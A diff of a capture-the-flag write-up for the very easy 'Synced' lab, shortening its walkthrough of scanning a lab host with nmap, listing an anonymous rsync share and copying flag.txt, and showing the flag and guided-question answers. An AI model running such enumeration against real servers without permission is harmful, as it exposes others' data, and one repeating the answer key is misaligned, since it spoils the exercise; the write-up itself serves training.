@@ -1,68 +1,38 @@
 # Synced
 
-|            |                                                                  |
-|------------|------------------------------------------------------------------|
-| Track      | Starting Point - Tier 0                                          |
-| Difficulty | Very Easy                                                        |
-| OS         | Linux                                                            |
-| Tags       | Rsync, Network, Protocols, Reconnaissance, Anonymous Access      |
-| Tools      | `nmap`, `rsync`                                                  |
+|            |                                                              |
+|------------|--------------------------------------------------------------|
+| Track      | Starting Point - Tier 0                                      |
+| Difficulty | Very Easy                                                    |
+| OS         | Linux                                                        |
+| Tags       | Rsync, Network, Protocols, Reconnaissance, Anonymous Access  |
+| Tools      | `nmap`, `rsync`                                              |
 
 ## Summary
 
-An rsync daemon on its default port with anonymous read access to a `public`
-share. The flag is sitting in the share root.
+rsync daemon on its default port with anonymous read access to a `public`
+share. The trick is treating rsync as a service to enumerate, not just a copy
+tool: `--list-only` against a bare `rsync://` URL is the equivalent of
+`smbclient -L` for SMB.
 
-## Notes
-
-- `man rsync` answers most of the guided questions on this box.
-
-## Recon
-
-Full TCP scan:
-
-```bash
-nmap -p- -sT --min-rate 5000 10.129.97.233
-```
-
-```
-PORT    STATE SERVICE
-873/tcp open  rsync
-```
-
-Version probe:
+## Solve
 
 ```bash
 nmap -sV -p 873 10.129.97.233
-```
+# 873/tcp open  rsync   (protocol version 31)
 
-```
-PORT    STATE SERVICE VERSION
-873/tcp open  rsync   (protocol version 31)
-```
-
-## Foothold
-
-rsync allows anonymous module listing with `--list-only`. The daemon exposes
-one share called `public`.
-
-```bash
-# List modules
+# Enumerate exposed modules
 rsync --list-only rsync://10.129.97.233
-public          Anonymous Share
+# public          Anonymous Share
 
-# List files in the module
+# List what's in it
 rsync --list-only rsync://10.129.97.233/public
-drwxr-xr-x          4,096 2022/10/25 09:02:23 .
--rw-r--r--             33 2022/10/25 08:32:03 flag.txt
+# -rw-r--r--   33  2022/10/25 08:32:03 flag.txt
 
-# Pull the flag down
+# Pull the flag
 rsync rsync://10.129.97.233/public/flag.txt ./flag.txt
-```
 
-## Flag
-
-```
+cat flag.txt
 72eaf5344ebb84908ae543a719830519
 ```
 
@@ -76,4 +46,3 @@ rsync rsync://10.129.97.233/public/flag.txt ./flag.txt
 | 4 | What is the most common command name on Linux to interact with rsync? | rsync |
 | 5 | What credentials do you have to pass to rsync in order to use anonymous authentication? | None |
 | 6 | What is the option to only list shares and files on rsync? | list-only |
-| Flag | Submit Root Flag | `72eaf5344ebb84908ae543a719830519` |
